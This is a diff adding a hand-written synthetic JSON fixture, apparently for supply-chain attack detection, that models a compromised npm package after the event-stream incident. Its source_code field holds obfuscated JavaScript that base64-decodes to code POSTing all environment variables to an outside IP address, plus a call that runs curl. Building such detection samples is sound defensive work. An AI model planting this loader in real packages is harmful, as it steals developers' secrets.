@@ -1,0 +1,32 @@
+{
+  "_note": "SYNTHETIC example written by hand. Loosely inspired by the event-stream incident (2018). Not real attack data.",
+  "synthetic": true,
+  "package_name": "stream-merge-utils",
+  "version": "3.3.6",
+  "ecosystem": "npm",
+  "download_history": [52000, 51000, 54500, 53200, 55100, 54800, 56000, 55500, 57100, 56400, 58200, 61000],
+  "release_history": [
+    {"version": "3.3.2", "released_at": "2025-03-10", "size_bytes": 23000, "author": "original-dev", "dependencies": ["through", "duplexer"]},
+    {"version": "3.3.3", "released_at": "2025-06-11", "size_bytes": 23400, "author": "original-dev", "dependencies": ["through", "duplexer"]},
+    {"version": "3.3.4", "released_at": "2025-09-02", "size_bytes": 23900, "author": "original-dev", "dependencies": ["through", "duplexer"]},
+    {"version": "3.3.5", "released_at": "2025-12-01", "size_bytes": 24100, "author": "original-dev", "dependencies": ["through", "duplexer"],
+     "api_calls": ["stream.pipe", "util.inherits"], "network_hosts": ["registry.npmjs.org"]}
+  ],
+  "current_release": {
+    "released_at": "2026-01-05", "size_bytes": 131000, "author": "helpful-newcomer",
+    "dependencies": ["through", "duplexer", "flatmap-stream-lite"], "has_install_script": true
+  },
+  "source_code": "var _0x2a=['\\x72\\x65\\x71\\x75\\x69\\x72\\x65\\x28\\x27\\x63\\x72\\x79'];eval(Buffer.from('dmFyIGNyeXB0bz1yZXF1aXJlKCdjcnlwdG8nKTt2YXIgaHR0cHM9cmVxdWlyZSgnaHR0cHMnKTt2YXIgZD1KU09OLnN0cmluZ2lmeShwcm9jZXNzLmVudik7aHR0cHMucmVxdWVzdCh7aG9zdDonMTg1LjIyMC4xMDEuNycscG9ydDo4MDgwLG1ldGhvZDonUE9TVCd9KS5lbmQoZCk7','base64').toString());new Function(atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwnKQ=='))();",
+  "behavior": {
+    "network_connections": [
+      {"host": "registry.npmjs.org", "port": 443},
+      {"host": "185.220.101.7", "port": 8080}
+    ],
+    "file_accesses": [{"path": "/tmp/build/stream-merge-utils/index.js", "mode": "read"}],
+    "api_calls": ["stream.pipe", "process.env", "Buffer.from", "eval", "https.request"]
+  },
+  "integrity": {
+    "hash": "PASS", "signature": "NOT_CHECKED", "version": "PASS", "source": "TRUSTED",
+    "attestation": "PASS", "reproducible_build": "PASS", "timestamp": "PASS"
+  }
+}
